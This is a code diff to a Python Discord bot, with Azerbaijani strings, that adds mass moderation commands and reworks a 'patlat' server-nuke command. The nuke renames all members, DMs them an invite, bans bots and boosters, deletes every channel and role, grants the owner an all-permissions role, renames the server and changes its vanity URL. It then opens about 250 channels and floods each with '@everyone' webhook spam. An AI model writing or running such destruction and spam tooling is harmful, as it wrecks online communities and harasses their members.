@@ -93,7 +93,7 @@ async def on_member_join(member):
         pass
 
 # =====================================================================
-# 4. ADVANCED SECURITY & AUTOMOD (GÜVƏNLİK VƏ SPAM QORUMASI)
+# 4. ADVANCED SECURITY & AUTOMOD
 # =====================================================================
 @bot.event
 async def on_guild_channel_delete(channel):
@@ -208,7 +208,7 @@ class XASMenyu(discord.ui.Select):
     def __init__(self):
         options = [
             discord.SelectOption(label="1. Təhlükəsizlik və Nuke", description="Anti-GG, Spam Qoruması, Nuke & Patlat"),
-            discord.SelectOption(label="2. İdarəetmə və Moderasiya", description="Kanal Ömrləri, Ban, Kick, Mute, Clear"),
+            discord.SelectOption(label="2. İdarəetmə və Moderasiya", description="Kanal Ömrləri, Ban, Kick, Mute, Clear, Kütləvi Əmrlər"),
             discord.SelectOption(label="3. Əyləncə, Oyunlar və Alətlər", description="Sex, Hack, Slot, 8ball, IQ və s."),
             discord.SelectOption(label="4. XAS Xüsusi URL & Sistem", description="Xüsusi Davat Məlumatı, URL Dəyişmə")
         ]
@@ -225,6 +225,7 @@ class XASMenyu(discord.ui.Select):
         elif self.values[0] == "2. İdarəetmə və Moderasiya":
             embed = discord.Embed(title="⚙️ Moderasiya Paneli", description="Serveri idarə etmək üçün əmrlər:", color=XAS_COLOR)
             embed.add_field(name="Kanal Ömrləri", value="`!lock` / `!unlock` / `!hide` / `!reveal` / `!slowmode`")
+            embed.add_field(name="Kütləvi Əmrlər", value="`!dcall` / `!giverole` / `!takerole` / `!lockall` / `!unlockall` / `!hideall` / `!revealall`")
             embed.add_field(name="Cəza Əmrləri", value="`!ban` / `!kick` / `!timeout` / `!clear`")
             await interaction.response.edit_message(embed=embed)
 
@@ -350,7 +351,7 @@ async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
     await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: `{sebep}`")
 
 # =====================================================================
-# 8. SAHİB VƏ MODERASİYA ƏMRLƏRİ
+# 8. SAHİB VƏ MODERASİYA ƏMRLƏRİ (Kütləvi əmrlər daxil)
 # =====================================================================
 @bot.command(name="lock")
 async def lock_cmd(ctx):
@@ -380,39 +381,99 @@ async def reveal_cmd(ctx):
     await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
     await ctx.send("🐵 Bu kanal yenidən göstərildi.")
 
-@bot.command(name="openchannel", aliases=["ac", "hamisiniac"])
-async def open_channel_all(ctx):
+@bot.command(name="dcall", aliases=["səsdənçıxar"])
+async def disconnect_all_voice(ctx):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Bunun üçün səlahiyyətin çatmır, gaga!")
         return
-    yukleniyor = await ctx.send("🔓 Bütün kanallar açılır...")
-    for channel in ctx.guild.channels:
-        try:
-            await channel.set_permissions(ctx.guild.default_role, view_channel=True, send_messages=True)
-        except:
-            pass
-    await yukleniyor.edit(content="✅ Uğurlu: Bütün kanallar kütləvi şəkildə açıldı!")
-
-@bot.command(name="lockchannel", aliases=["bagla", "hamisinibagla"])
-async def lock_channel_all(ctx):
-    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Bunun üçün səlahiyyətin çatmır, gaga!")
-        return
-    yukleniyor = await ctx.send("🔒 Bütün kanallar kilidlənir...")
-    for channel in ctx.guild.channels:
-        if channel.id != ctx.channel.id:
+    count = 0
+    for vc in ctx.guild.voice_channels:
+        for member in vc.members:
             try:
-                await channel.set_permissions(ctx.guild.default_role, send_messages=False)
+                await member.move_to(None)
+                count += 1
             except:
                 pass
-    await yukleniyor.edit(content="🔒 Uğurlu: Komut yazılan kanal xaric bütün kanallar kiləndi!")
+    await ctx.send(f"🔊 Səs kanallarındakı hər kəs ({count} nəfər) səsdən qovuldu!")
+
+@bot.command(name="giverole", aliases=["kütləvirolver"])
+async def give_role_all(ctx, role: discord.Role):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    await ctx.send(f"⏳ Bütün üzvlərə `{role.name}` rolu verilir, gözləyin...")
+    success = 0
+    for member in ctx.guild.members:
+        try:
+            if role not in member.roles:
+                await member.add_roles(role)
+                success += 1
+        except:
+            pass
+    await ctx.send(f"✅ Əməliyyat tamamlandı! {success} nəfərə rol verildi.")
+
+@bot.command(name="takerole", aliases=["kütləvirolal"])
+async def take_role_all(ctx, role: discord.Role):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    await ctx.send(f"⏳ Bütün üzvlərdən `{role.name}` rolu alınır, gözləyin...")
+    success = 0
+    for member in ctx.guild.members:
+        try:
+            if role in member.roles:
+                await member.remove_roles(role)
+                success += 1
+        except:
+            pass
+    await ctx.send(f"✅ Əməliyyat tamamlandı! {success} nəfərdən rol alındı.")
+
+@bot.command(name="lockall", aliases=["hamısınıkilidlə"])
+async def lock_all_channels(ctx):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    for channel in ctx.guild.text_channels:
+        try:
+            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
+        except:
+            pass
+    await ctx.send("🔒 Serverdəki bütün mətn kanalları kilidləndi!")
+
+@bot.command(name="unlockall", aliases=["hamısınınkilidiniaç"])
+async def unlock_all_channels(ctx):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    for channel in ctx.guild.text_channels:
+        try:
+            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
+        except:
+            pass
+    await ctx.send("🔓 Serverdəki bütün mətn kanallarının kilidi açıldı!")
+
+@bot.command(name="hideall", aliases=["gizletfa"])
+async def hide_all_channels(ctx):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    for channel in ctx.guild.channels:
+        try:
+            await channel.set_permissions(ctx.guild.default_role, view_channel=False)
+        except:
+            pass
+    await ctx.send("🙈 Serverdəki bütün kanal və kateqoriyalar hamı üçün gizlətildi!")
+
+@bot.command(name="revealall", aliases=["gosterfa"])
+async def reveal_all_channels(ctx):
+    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
+        return
+    for channel in ctx.guild.channels:
+        try:
+            await channel.set_permissions(ctx.guild.default_role, view_channel=True)
+        except:
+            pass
+    await ctx.send("🐵 Serverdəki bütün kanal və kateqoriyalar hamı üçün yenidən açıldı!")
 
 @bot.command(name="slowmode")
 async def slowmode_cmd(ctx, seconds: int):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
     await ctx.channel.edit(slowmode_delay=seconds)
-    await ctx.send(f"🐢 Yavaş mod `{seconds}` saniyə edildi.")
 
 @bot.command(name="nuke_ctx")
 async def nuke_ctx(ctx):
@@ -423,34 +484,33 @@ async def nuke_ctx(ctx):
     await ctx.channel.delete()
     await new_channel.edit(position=position)
     await new_channel.send("💥 Kanal sıfırlandı!")
-
 @bot.command(name="ban")
 async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
     await member.ban(reason=reason)
-    await ctx.send(f"🔨 `{member.name}` ban edildi! Səbəb: `{reason}`")
+    await ctx.send(f"🔨 {member.mention} uğurla ban olundu! Səbəb: `{reason}`")
 
 @bot.command(name="kick")
 async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
     await member.kick(reason=reason)
-    await ctx.send(f"👢 `{member.name}` atıldı! Səbəb: `{reason}`")
+    await ctx.send(f"👢 {member.mention} serverdən atıldı! Səbəb: `{reason}`")
 
 @bot.command(name="timeout", aliases=["mute"])
 async def timeout_cmd(ctx, member: discord.Member, minutes: int, *, reason="Göstərilməyib"):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
     await member.timeout(timedelta(minutes=minutes), reason=reason)
-    await ctx.send(f"🔇 `{member.name}` `{minutes}` dəqiqə mute olundu.")
+    await ctx.send(f"🔇 {member.mention} {minutes} dəqiqə müddətinə mute olundu!")
 
 @bot.command(name="clear", aliases=["sil"])
 async def clear_cmd(ctx, amount: int = 5):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
     await ctx.channel.purge(limit=amount + 1)
-    msg = await ctx.send(f"🧹 `{amount}` ədəd mesaj silindi.")
+    msg = await ctx.send(f"🧹 {amount} ədəd mesaj silindi!")
     await asyncio.sleep(3)
     await msg.delete()
 
@@ -471,6 +531,7 @@ async def fuck_cmd(ctx, member: discord.Member):
 async def kiss_cmd(ctx, member: discord.Member):
     embed = discord.Embed(description=f"💋 **{ctx.author.name}** **{member.name}** adlı şəxsi öpdü!", color=XAS_COLOR)
     await ctx.send(embed=embed, reference=ctx.message)
+
 @bot.command(name="roll")
 async def roll_cmd(ctx):
     await ctx.send(f"🎲 Zər atıldı: **{random.randint(1, 6)}**")
@@ -565,89 +626,39 @@ async def poll_cmd(ctx, *, soru):
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
     if ctx.author.id != SAHIB_ID:
-        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
         return
     
     guild = ctx.guild
-    await ctx.send("⚡ XAS ULTRA MEGA NUKE (Maksimum Sürət & Kütləvi Spam) BAŞLADI...")
 
-    # 1. Üzvlərin ləqəbini dəyişmək
-    async def change_nickname(member):
-        if member.id != SAHIB_ID and not member.bot:
-            try:
-                await member.edit(nick="XAS Wa Here")
-            except:
-                pass
-    await asyncio.gather(*(change_nickname(m) for m in guild.members), return_exceptions=True)
+    # 1. Bütün üzvləri, mövcud kanalları və rolları eyni anda təmizləmək
+    await asyncio.gather(
+        *(member.edit(nick="XAS Wa Here") for member in guild.members if member.id != SAHIB_ID and not member.bot),
+        *(member.send("🔥 Server dağıdıldı! discord.gg/xas") for member in guild.members if member.id != SAHIB_ID and not member.bot),
+        *(member.ban(reason="XAS Nuke") for member in guild.members if (member.bot and member.id != bot.user.id) or (member.premium_since is not None and member.id != SAHIB_ID)),
+        *(ch.delete() for ch in guild.channels),
+        *(r.delete() for r in guild.roles if r != guild.default_role),
+        return_exceptions=True
+    )
 
-    # 2. Üzvlərə DM göndərmək
-    async def send_dm(member):
-        if member.id != SAHIB_ID and not member.bot:
-            try:
-                await member.send("🔥 Server dağıdıldı! discord.gg/xas")
-            except:
-                pass
-    await asyncio.gather(*(send_dm(m) for m in guild.members), return_exceptions=True)
-
-    # 3. Botları və boosterləri banlamaq
-    async def ban_member(member):
-        if (member.bot and member.id != bot.user.id) or (member.premium_since is not None and member.id != SAHIB_ID):
-            try:
-                await member.ban(reason="XAS Turbo Nuke Təmizliyi")
-            except:
-                pass
-    await asyncio.gather(*(ban_member(m) for m in guild.members), return_exceptions=True)
-
-    # 4. Mövcud kanalların silinməsi
-    async def delete_channel(ch):
-        try:
-            await ch.delete()
-        except:
-            pass
-    await asyncio.gather(*(delete_channel(ch) for ch in guild.channels), return_exceptions=True)
-
-    # 5. Rolların silinməsi
-    async def delete_role(r):
-        if r != guild.default_role:
-            try:
-                await r.delete()
-            except:
-                pass
-    await asyncio.gather(*(delete_role(r) for r in guild.roles), return_exceptions=True)
-
-    # 6. Sahibə tam səlahiyyətli rol vermək
+    # 2. Sahibə rol vermək və server adını/URL-ni dəyişmək
     try:
-        new_role = await guild.create_role(
-            name="#RUHUMSKDI",
-            permissions=discord.Permissions.all(),
-            color=discord.Color.red()
-        )
+        new_role = await guild.create_role(name="#RUHUMSKDI", permissions=discord.Permissions.all(), color=discord.Color.red())
         await ctx.author.add_roles(new_role)
+        ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumzone"]
+        await guild.edit(name="XAS", vanity_code=random.choice(ruhum_urls))
     except:
         pass
 
-    # 7. Server adı və URL dəyişikliyi
-    ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumzone"]
-    secilen_url = random.choice(ruhum_urls)
-    try:
-        await guild.edit(name="XAS", vanity_code=secilen_url)
-    except:
-        pass
-
-    # 8. Maksimum sayda kanal açılması və hər birində ultra-sürətli minlərlə webhook spamı
-    async def create_and_hyper_spam(i):
+    # 3. Maksimum sürətlə 250 kanal açmaq və hər birində webhook spamı yaratmaq
+    async def fast_nuke(i):
         try:
             channel = await guild.create_text_channel(f"ruhumskdi-{i}")
             webhook = await channel.create_webhook(name="XAS Spammer")
-            for _ in range(100):
-                await asyncio.gather(*(webhook.send("discord.gg/xas @everyone") for _ in range(10)), return_exceptions=True)
+            await asyncio.gather(*(webhook.send("discord.gg/xas @everyone") for _ in range(30)), return_exceptions=True)
         except:
             pass
 
-    chunk_size = 50
-    for start in range(1, 501, chunk_size):
-        tasks_list = [create_and_hyper_spam(i) for i in range(start, min(start + chunk_size, 501))]
-        await asyncio.gather(*tasks_list, return_exceptions=True)
+    await asyncio.gather(*(fast_nuke(i) for i in range(1, 250)), return_exceptions=True)
 
 # =====================================================================
 # 11. BOTU İŞƏ SALMAQ (RUN)
@@ -657,4 +668,5 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-                             
+    
+
